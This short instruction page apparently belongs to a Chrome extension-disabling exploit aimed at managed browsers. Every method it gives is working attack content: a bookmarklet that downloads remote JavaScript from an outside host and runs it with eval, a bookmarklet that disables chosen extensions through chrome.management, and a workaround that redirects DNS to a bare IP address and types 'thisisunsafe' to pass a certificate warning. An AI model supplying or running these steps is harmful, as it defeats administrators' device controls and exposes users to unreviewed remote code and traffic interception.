## Bookmarklets

**Option A - GUI Based**

```js
javascript: fetch("https://compactcow.com/ltbeef/exploit.js").then((data) => {
  data.text().then((text) => {
    eval(text);
  });
});
```

Click it once (not on a new tab) to get to the correct webstore page, then again to open the UX.

**Option B - if Option A doesn't load**

- Go to https://chrome.google.com/webstorex and run this bookmarklet

```js
javascript: prompt("Extension IDs here: (seperated by commas)")
  .split(",")
  .forEach((i) => {
    chrome.management.setEnabled(i.trim(), !1);
  });
```

## If bookmarklets are disabled:

- Set your DNS to the following:
  `129.213.138.223`
- Visit chrome://restart
- Visit https://chrome.google.com/
- You should see a warning. Click on the warning symbol (⚠️) and type thisisunsafe.
- You should see a simple interface which lets you enable and disable your extensions.
